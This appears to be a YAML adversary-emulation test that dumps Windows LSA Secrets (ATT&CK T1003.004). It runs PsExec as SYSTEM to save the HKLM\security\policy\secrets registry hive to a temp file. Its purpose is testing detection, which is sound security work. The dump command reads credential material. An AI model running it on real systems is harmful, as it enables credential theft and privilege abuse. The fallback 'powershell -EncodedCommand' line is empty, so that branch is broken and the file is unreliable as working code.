- id: 0d657a23-900c-535d-baa4-f7fd041e4831
  name: Soumaia ART Tests - Dumping LSA Secrets
  description: 'Dump secrets key from Windows registry

    When successful, the dumped file will be written to $env:Temp\secrets.

    Attackers may use the secrets key to assist with extracting passwords and enumerating other sensitive system information.

    https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/#:~:text=LSA%20Secrets%20is%20a%20registry,host%2C%20local%20security%20policy%20etc. (requires elevation)'
  tactic: credential-access
  technique:
    attack_id: T1003.004
    name: 'OS Credential Dumping: LSA Secrets'
  platforms:
    windows:
      cmd:
        command: |-
          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABUADEAMAAwADMALgAwADAANABcAGIAaQBuAFwAUABzAEUAeABlAGMALgBlAHgAZQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AA==
          if not "%ERRORLEVEL%"=="0" (
              powershell -NoProfile -EncodedCommand 
          )
          "%TEMP%\ART-ExternalPayloads\T1003.004\bin\PsExec.exe" -accepteula -s reg save HKLM\security\policy\secrets %temp%\secrets /y
        cleanup: |-
          del %temp%\secrets >nul 2> nul
